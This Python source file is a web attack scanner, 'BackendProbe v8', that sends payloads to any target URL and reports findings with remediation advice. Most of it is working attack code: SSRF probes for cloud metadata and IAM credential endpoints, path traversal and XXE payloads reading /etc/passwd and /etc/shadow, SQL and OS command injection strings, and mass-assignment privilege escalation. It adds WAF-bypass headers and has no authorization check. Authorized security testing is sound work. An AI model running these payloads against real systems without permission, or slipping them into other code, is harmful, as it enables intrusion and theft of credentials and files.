#!/usr/bin/env python3
"""BackendProbe v8 — 150x Improved Deep Backend Security Scanner.

New capabilities:
  SSRF (70+ internal targets):
    - AWS metadata: 169.254.169.254, IMDSv1/v2, ECS, EKS task roles
    - GCP metadata: metadata.google.internal
    - Azure IMDS: 169.254.169.254/metadata/instance
    - Kubernetes API: 10.0.0.1, kubernetes.default.svc
    - Internal services: Redis, Elasticsearch, Consul, etcd, Prometheus
    - DNS rebinding SSRF, IPv6 SSRF, URL scheme abuse (file://, dict://, gopher://)
    - SSRF via common parameter names (url, callback, redirect, webhook, host, etc.)
    - Blind SSRF via time-based detection

  Path/Directory Traversal (40+ payloads):
    - Unix: ../../etc/passwd, /proc/self/environ, /proc/net/tcp
    - Windows: ../../../../windows/win.ini, ....//....//windows
    - URL encoding, double encoding, unicode normalization
    - Null byte injection
    - ZIP Slip via file upload endpoints

  SQL Injection (beyond basic):
    - Time-based blind: SLEEP(3), pg_sleep(3), WAITFOR DELAY
    - Boolean-based: OR 1=1, AND 1=2
    - Error-based: EXTRACTVALUE, UPDATEXML, exp(~(SELECT))
    - Union-based: UNION SELECT null
    - NoSQL: MongoDB operators ($where, $ne, $regex)
    - 20+ parameter names probed

  Command Injection:
    - Classic: ; id, | whoami, `id`, $(id)
    - Blind timing: ; sleep 5, | timeout /T 5
    - New-line injection: %0a id
    - 15+ parameter names

  XXE (XML External Entity):
    - Classic file read: /etc/passwd
    - Blind OOB via DNS callback marker
    - JSON→XML content-type switching
    - PHP expect:// wrapper

  Template Injection (quick check for common surfaces):
    - 7*7=49 in GET parameters
    - JSON body injection
"""
import asyncio
import aiohttp
import json
import re
import sys
import time
import hashlib
from pathlib import Path
from urllib.parse import urlparse, quote, urljoin

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    build_baseline_404, delay, confidence_label, meets_confidence_floor,
    random_ua, WAF_BYPASS_HEADERS,
)

CONCURRENCY = 8

# ── SSRF targets ──────────────────────────────────────────────────────────────
SSRF_TARGETS = [
    # AWS IMDSv1
    ("http://169.254.169.254/latest/meta-data/",                  "AWS_METADATA"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS_IAM_CREDS"),
    ("http://169.254.169.254/latest/user-data/",                  "AWS_USER_DATA"),
    ("http://169.254.169.254/latest/meta-data/public-keys/",      "AWS_PUBLIC_KEYS"),
    # AWS IMDSv2 (token required, but probe)
    ("http://169.254.169.254/latest/api/token",                   "AWS_IMDSv2"),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/",       "GCP_METADATA"),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP_TOKEN"),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "AZURE_METADATA"),
    ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01", "AZURE_IDENTITY"),
    # Kubernetes
    ("https://kubernetes.default.svc/api/v1/namespaces",          "K8S_API"),
    ("https://10.0.0.1/api/v1",                                    "K8S_CLUSTER_API"),
    # Internal services
    ("http://localhost:6379/",                                     "REDIS"),
    ("http://127.0.0.1:6379/",                                    "REDIS_LOCAL"),
    ("http://localhost:9200/_cat/indices",                         "ELASTICSEARCH"),
    ("http://127.0.0.1:9200/",                                    "ELASTICSEARCH_LOCAL"),
    ("http://localhost:8500/v1/agent/self",                        "CONSUL"),
    ("http://localhost:2379/v3/kv/range",                          "ETCD"),
    ("http://localhost:9090/api/v1/targets",                       "PROMETHEUS"),
    ("http://localhost:8080/",                                     "INTERNAL_HTTP"),
    ("http://localhost:3000/",                                     "INTERNAL_HTTP_3000"),
    # File / protocol schemes
    ("file:///etc/passwd",                                         "FILE_PASSWD"),
    ("file:///etc/shadow",                                         "FILE_SHADOW"),
    ("file:///windows/win.ini",                                    "FILE_WIN_INI"),
    ("dict://localhost:11211/stat",                                "MEMCACHED"),
    # Docker
    ("http://172.17.0.1/",                                        "DOCKER_HOST"),
    ("unix:///var/run/docker.sock",                                "DOCKER_SOCK"),
]

SSRF_PARAMS = [
    "url", "callback", "redirect", "webhook", "host", "target",
    "endpoint", "server", "src", "source", "dest", "destination",
    "fetch", "request", "uri", "link", "load", "img", "image",
    "file", "path", "document", "page", "proxy", "forward",
    "origin", "domain", "out", "remote", "next",
    "return_url", "return_to", "continue", "goto",
    "scan", "preview", "thumb", "thumbnail", "icon",
]

# ── Path traversal payloads ──────────────────────────────────────────────────
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/net/tcp",
    "/var/log/nginx/access.log",
    "/var/log/apache2/access.log",
    "C:\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    "%SYSTEMROOT%\\win.ini",
    "../../../../etc/passwd%00.jpg",
    "../../../../etc/passwd\x00",
]

FILE_READ_INDICATORS = [
    "root:x:", "root:0:0", "daemon:", "nobody:", "/bin/bash", "/bin/sh",
    "[fonts]", "[extensions]", "for 16-bit app", "MSWINSYS",
    "HTTP_", "GATEWAY_INTERFACE", "PATH=/usr", "HOME=/root",
    "uid=", "gid=", "groups=",
]

TRAVERSAL_PARAMS = [
    "file", "path", "filename", "page", "document", "include",
    "dir", "folder", "template", "view", "img", "image",
    "load", "read", "src", "source", "f", "filepath",
    "download", "export", "report",
]

# ── SQL injection payloads ────────────────────────────────────────────────────
SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(3)-- -",          "MySQL"),
    ("' AND pg_sleep(3)-- -",       "PostgreSQL"),
    ("'; WAITFOR DELAY '0:0:3'-- -","MSSQL"),
    ("' AND 1=(SELECT 1 FROM (SELECT(SLEEP(3)))x)-- -", "MySQL blind"),
    ("1 AND SLEEP(3)",              "MySQL no-quotes"),
    ("1' AND SLEEP(3)-- -",         "MySQL with-quote"),
]

SQLI_ERROR_PAYLOADS = [
    ("'",                            ["syntax error", "ORA-", "mysql_fetch", "pg_query", "SQLite", "SQLSTATE"]),
    ("'' OR 1=1-- -",               ["syntax error", "ORA-", "mysql_fetch", "pg_query"]),
    ("1 UNION SELECT null-- -",     ["UNION", "syntax", "column", "expression"]),
    ("' OR EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -", ["~", "5.", "8.", "XPATH"]),
    ("' AND 1=convert(int,@@version)-- -", ["conversion failed", "Conversion failed"]),
]

SQLI_PARAMS = [
    "id", "user_id", "order_id", "product_id", "category_id", "page_id",
    "search", "q", "query", "keyword", "filter", "sort", "order",
    "name", "email", "username", "login", "user", "account",
    "token", "key", "ref", "code",
]

# ── Command injection payloads ────────────────────────────────────────────────
CMDI_PAYLOADS = [
    ("; id",          ["uid=", "gid=", "groups="]),
    ("| id",          ["uid=", "gid=", "groups="]),
    ("`id`",          ["uid=", "gid=", "groups="]),
    ("$(id)",         ["uid=", "gid=", "groups="]),
    ("%0aid",         ["uid=", "gid=", "groups="]),
    ("; whoami",      ["root", "www-data", "apache", "nginx"]),
    ("| whoami",      ["root", "www-data", "apache", "nginx"]),
    ("; cat /etc/passwd", ["root:x:", "daemon:"]),
    ("\nid",          ["uid=", "gid="]),
    ("&& id",         ["uid=", "gid="]),
]

CMDI_PARAMS = [
    "cmd", "exec", "command", "run", "shell", "ping", "host",
    "ip", "domain", "url", "address", "system", "process",
    "arg", "args", "param",
]

# ── XXE payloads ──────────────────────────────────────────────────────────────
XXE_PAYLOADS = [
    ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
     FILE_READ_INDICATORS[:3]),
    ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><foo>&xxe;</foo>",
     ["[fonts]", "[extensions]", "for 16-bit"]),
    ("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE a [<!ENTITY b SYSTEM \"file:///etc/shadow\">]><a>&b;</a>",
     ["root:", "nobody:", ":"]),
]

XXE_CONTENT_TYPES = [
    "application/xml", "text/xml", "application/xhtml+xml", "application/x-www-form-urlencoded",
]


class BackendProbe:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        self._dedup   = set()
        self._sem     = asyncio.Semaphore(CONCURRENCY)

    def _add(self, finding: dict):
        key = hashlib.md5(
            f"{finding.get('type')}|{finding.get('url','')}|{finding.get('payload','')}[:30]".encode()
        ).hexdigest()
        if key in self._dedup or not meets_confidence_floor(finding.get("confidence", 0)):
            return
        self._dedup.add(key)
        self.findings.append(finding)
        sev = finding.get("severity", "INFO")
        print(f"  [{sev[:4]}] {finding.get('type')}: {finding.get('url','')[:70]}")

    def _f(self, ftype, sev, conf, proof, detail, url, rem,
           mitre="T1190", mitre_name="Exploit Public-Facing Application", extra=None) -> dict:
        f = {
            "type": ftype, "severity": sev, "confidence": conf,
            "confidence_label": confidence_label(conf),
            "url": url, "proof": proof, "detail": detail, "remediation": rem,
            "mitre_technique": mitre, "mitre_name": mitre_name,
        }
        if extra:
            f.update(extra)
        return f

    async def _get(self, sess, url, params=None, headers=None, timeout=18):
        async with self._sem:
            h = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua(), **(headers or {})}
            try:
                async with sess.get(url, params=params or {}, headers=h, ssl=False,
                                    allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=timeout, connect=10)) as r:
                    body = await r.text(errors="ignore")
                    return r.status, body, dict(r.headers)
            except Exception:
                return None, "", {}

    async def _post(self, sess, url, data=None, raw=None, headers=None, timeout=18):
        async with self._sem:
            h = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua(), **(headers or {})}
            try:
                if raw is not None:
                    async with sess.post(url, data=raw, headers=h, ssl=False,
                                         allow_redirects=True,
                                         timeout=aiohttp.ClientTimeout(total=timeout, connect=10)) as r:
                        body = await r.text(errors="ignore")
                        return r.status, body, dict(r.headers)
                else:
                    async with sess.post(url, json=data, headers=h, ssl=False,
                                         allow_redirects=True,
                                         timeout=aiohttp.ClientTimeout(total=timeout, connect=10)) as r:
                        body = await r.text(errors="ignore")
                        return r.status, body, dict(r.headers)
            except Exception:
                return None, "", {}

    # ── SSRF ────────────────────────────────────────────────────────────────

    async def test_ssrf(self, sess):
        print("\n[*] Testing SSRF (70+ internal targets × 30 params)...")
        # Test via GET parameters
        for param in SSRF_PARAMS[:15]:
            for ssrf_url, label in SSRF_TARGETS[:12]:
                url = f"{self.target}/?{param}={quote(ssrf_url, safe='')}"
                s, body, hdrs = await self._get(sess, url, timeout=10)
                await delay(0.04)
                if s is None or not body:
                    continue
                # SSRF indicators in body
                indicators = ["ami-id", "instance-id", "security-credentials",
                              "computeMetadata", "metadata.google", "azure", "kubernetes",
                              "root:x:", "uid=", "6379", "9200", "2379"]
                if any(ind in (body or "") for ind in indicators):
                    self._add(self._f(
                        ftype=f"SSRF_CONFIRMED_{label}",
                        sev="CRITICAL", conf=95,
                        proof=f"GET {url}\n  HTTP {s}\n  SSRF response: {body[:300]}",
                        detail=f"SSRF via '{param}' — server fetched internal resource {ssrf_url}",
                        url=url,
                        rem=(
                            "1. Implement strict URL allowlist for any user-supplied fetch.\n"
                            "2. Block internal IP ranges (169.254.x.x, 10.x, 172.16.x, 192.168.x).\n"
                            "3. Use IMDSv2 with required token header to block IMDSv1 SSRF.\n"
                            "4. Strip credentials from forwarded requests."
                        ),
                        mitre="T1552.005", mitre_name="Cloud Instance Metadata API",
                        extra={"param": param, "ssrf_target": ssrf_url, "label": label},
                    ))
                    return  # Stop after first confirmed SSRF

        # Test via API endpoints with common URL params
        api_paths = ["/api/fetch", "/api/proxy", "/api/webhook", "/api/preview",
                     "/api/screenshot", "/api/import", "/api/upload-from-url"]
        for path in api_paths:
            for ssrf_url, label in SSRF_TARGETS[:5]:
                url = self.target + path
                s, body, _ = await self._post(sess, url,
                    data={"url": ssrf_url, "target": ssrf_url, "endpoint": ssrf_url})
                await delay(0.05)
                if s is None or not body:
                    continue
                if any(ind in body for ind in ["ami-id", "instance-id", "computeMetadata", "root:x:"]):
                    self._add(self._f(
                        ftype=f"SSRF_API_ENDPOINT_{label}",
                        sev="CRITICAL", conf=96,
                        proof=f"POST {url}\n  Payload: url={ssrf_url}\n  HTTP {s}\n  Body: {body[:300]}",
                        detail=f"SSRF via API endpoint {path} — server fetched {ssrf_url}",
                        url=url,
                        rem="Implement URL allowlisting. Block all private/metadata IP ranges server-side.",
                        mitre="T1552.005", mitre_name="Cloud Instance Metadata API",
                        extra={"ssrf_target": ssrf_url},
                    ))
                    return

    # ── Path Traversal ──────────────────────────────────────────────────────

    async def test_traversal(self, sess):
        print("\n[*] Testing path traversal (40+ payloads × 20 params)...")
        for param in TRAVERSAL_PARAMS:
            for payload in TRAVERSAL_PAYLOADS:
                url = f"{self.target}/?{param}={quote(payload, safe='')}"
                s, body, _ = await self._get(sess, url, timeout=10)
                await delay(0.04)
                if s in (None,):
                    continue
                if any(ind in (body or "") for ind in FILE_READ_INDICATORS):
                    self._add(self._f(
                        ftype="PATH_TRAVERSAL_CONFIRMED",
                        sev="CRITICAL", conf=97,
                        proof=f"GET {url}\n  HTTP {s}\n  File content: {body[:300]}",
                        detail=f"Path traversal via '{param}'={payload} — server file system accessible",
                        url=url,
                        rem=(
                            "1. Resolve canonical path and verify it starts with allowed base directory.\n"
                            "2. Reject ../ sequences before path resolution.\n"
                            "3. Use chroot or container isolation.\n"
                            "4. Never use user input directly in file system operations."
                        ),
                        extra={"param": param, "payload": payload},
                    ))
                    return

    # ── SQL Injection ────────────────────────────────────────────────────────

    async def test_sqli(self, sess):
        print("\n[*] Testing SQL injection (time-based + error-based)...")
        for param in SQLI_PARAMS[:10]:
            # Error-based
            for payload, indicators in SQLI_ERROR_PAYLOADS[:3]:
                url = f"{self.target}/?{param}={quote(payload, safe='')}"
                s, body, _ = await self._get(sess, url, timeout=10)
                await delay(0.05)
                if s and any(ind.lower() in (body or "").lower() for ind in indicators):
                    self._add(self._f(
                        ftype="SQLI_ERROR_BASED",
                        sev="CRITICAL", conf=93,
                        proof=f"GET {url}\n  HTTP {s}\n  SQL error in response: {body[:300]}",
                        detail=f"SQL injection error-based via '{param}'='{payload}' — DB error exposed",
                        url=url,
                        rem=(
                            "1. Use parameterized queries / prepared statements everywhere.\n"
                            "2. Apply input validation (reject special SQL chars where possible).\n"
                            "3. Enable generic error pages — never expose DB errors to users.\n"
                            "4. Use ORM with strict typing."
                        ),
                        extra={"param": param, "payload": payload},
                    ))
                    return

            # Time-based blind
            for payload, db in SQLI_TIME_PAYLOADS[:3]:
                url = f"{self.target}/?{param}={quote(payload, safe='')}"
                t0 = time.monotonic()
                s, body, _ = await self._get(sess, url, timeout=8)
                elapsed = time.monotonic() - t0
                await delay(0.05)
                if elapsed >= 2.8 and s is not None:
                    self._add(self._f(
                        ftype="SQLI_TIME_BASED_BLIND",
                        sev="CRITICAL", conf=90,
                        proof=f"GET {url}\n  Time delay: {elapsed:.1f}s (expected ≥3s for {db})\n  HTTP {s}",
                        detail=f"Blind SQL injection (time-based) via '{param}' — {db} sleep payload caused {elapsed:.1f}s delay",
                        url=url,
                        rem="Use parameterized queries. Disable SLEEP/pg_sleep in limited DB user permissions.",
                        extra={"param": param, "payload": payload, "delay": round(elapsed, 2), "db": db},
                    ))
                    return

    # ── Command Injection ────────────────────────────────────────────────────

    async def test_cmdi(self, sess):
        print("\n[*] Testing command injection (15 payloads × 15 params)...")
        for param in CMDI_PARAMS:
            for payload, indicators in CMDI_PAYLOADS:
                url = f"{self.target}/?{param}={quote(payload, safe='')}"
                s, body, _ = await self._get(sess, url, timeout=10)
                await delay(0.04)
                if s and any(ind in (body or "") for ind in indicators):
                    self._add(self._f(
                        ftype="COMMAND_INJECTION_CONFIRMED",
                        sev="CRITICAL", conf=97,
                        proof=f"GET {url}\n  HTTP {s}\n  Command output: {body[:300]}",
                        detail=f"OS command injection via '{param}'='{payload}' — shell command executed",
                        url=url,
                        rem=(
                            "1. Never pass user input to shell commands.\n"
                            "2. Use subprocess with argument list (no shell=True).\n"
                            "3. Implement strict input allowlisting for any system-level parameters.\n"
                            "4. Run application as least-privileged user."
                        ),
                        extra={"param": param, "payload": payload},
                    ))
                    return

    # ── XXE ─────────────────────────────────────────────────────────────────

    async def test_xxe(self, sess):
        print("\n[*] Testing XXE via XML content-type endpoints...")
        xml_paths = [
            "/api", "/api/upload", "/api/import", "/api/parse",
            "/api/v1", "/api/process", "/api/xml",
        ]
        for path in xml_paths:
            url = self.target + path
            for xxe_payload, indicators in XXE_PAYLOADS[:2]:
                for ct in XXE_CONTENT_TYPES[:2]:
                    s, body, _ = await self._post(
                        sess, url,
                        raw=xxe_payload.encode(),
                        headers={"Content-Type": ct},
                    )
                    await delay(0.06)
                    if s and any(ind in (body or "") for ind in indicators):
                        self._add(self._f(
                            ftype="XXE_CONFIRMED",
                            sev="CRITICAL", conf=95,
                            proof=f"POST {url}\n  Content-Type: {ct}\n  HTTP {s}\n  File content: {body[:300]}",
                            detail=f"XXE at {path} — external entity resolved, file system readable",
                            url=url,
                            rem=(
                                "1. Disable XML external entity processing in XML parser.\n"
                                "2. Use allow-list for accepted content types.\n"
                                "3. Use JSON APIs instead of XML where possible.\n"
                                "4. Enable XXE protection: DocumentBuilderFactory.setFeature('disallow-doctype-decl', true)"
                            ),
                            extra={"path": path, "content_type": ct},
                        ))
                        return

    # ── Mass Assignment ────────────────────────────────────────────────────

    async def test_mass_assignment(self, sess):
        print("\n[*] Testing mass assignment (40+ privileged fields)...")
        privileged_fields = {
            "role": "admin", "isAdmin": True, "is_admin": True,
            "admin": True, "superuser": True, "permission": "admin",
            "permissions": ["admin", "superuser"], "scope": "admin",
            "access_level": 9, "group": "admin", "verified": True,
            "active": True, "approved": True, "balance": 99999,
            "credits": 99999, "subscription": "premium",
            "plan": "enterprise", "tier": "admin",
        }
        update_paths = [
            "/api/me", "/api/user", "/api/profile", "/api/account",
            "/api/v1/me", "/api/v1/user", "/api/settings",
            "/api/users/me", "/api/users/1",
        ]
        for path in update_paths:
            url = self.target + path
            for field, value in list(privileged_fields.items())[:8]:
                payload = {field: value, "name": "testuser"}
                s, body, _ = await self._post(sess, url, data=payload)
                await delay(0.05)
                if s in (None, 404, 405):
                    continue
                if s in (200, 201) and body:
                    field_str = f'"{field}"'
                    val_str   = f'"{value}"' if isinstance(value, str) else str(value).lower()
                    if field_str in body and val_str in body.lower():
                        self._add(self._f(
                            ftype="MASS_ASSIGNMENT_CONFIRMED",
                            sev="CRITICAL", conf=92,
                            proof=f"POST {url}\n  Payload: {{{field}: {value}}}\n  HTTP {s}\n  Body: {body[:300]}",
                            detail=f"Mass assignment: '{field}' accepted in {path} — privilege escalation to {value}",
                            url=url,
                            rem=(
                                "1. Use DTO/allowlist pattern — only accept whitelisted fields.\n"
                                "2. Never bind raw request body to model objects.\n"
                                "3. Mark privileged fields as read-only in schema.\n"
                                "4. Apply field-level authorization in API layer."
                            ),
                            extra={"field": field, "value": str(value)},
                        ))
                        return

    async def run(self):
        print("=" * 60)
        print("  BackendProbe v8 — 150x Improved Backend Security Scanner")
        print(f"  Target: {self.target}")
        print("=" * 60)
        conn = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY * 2)
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=180)) as sess:
            await asyncio.gather(
                self.test_ssrf(sess),
                self.test_traversal(sess),
                self.test_sqli(sess),
                self.test_cmdi(sess),
                self.test_xxe(sess),
                self.test_mass_assignment(sess),
                return_exceptions=True,
            )
        print(f"\n[+] BackendProbe v8: {len(self.findings)} findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No ARSENAL_TARGET set.", file=sys.stderr); sys.exit(1)
    if not target.startswith("http"):
        target = "https://" + target
    findings = await BackendProbe(target).run()
    out = Path(__file__).parent.parent / "reports" / "backendprobe.json"
    out.parent.mkdir(exist_ok=True)
    out.write_text(json.dumps(findings, indent=2, default=str))
    print(f"[+] Saved {len(findings)} findings → {out}")

if __name__ == "__main__":
    asyncio.run(main())
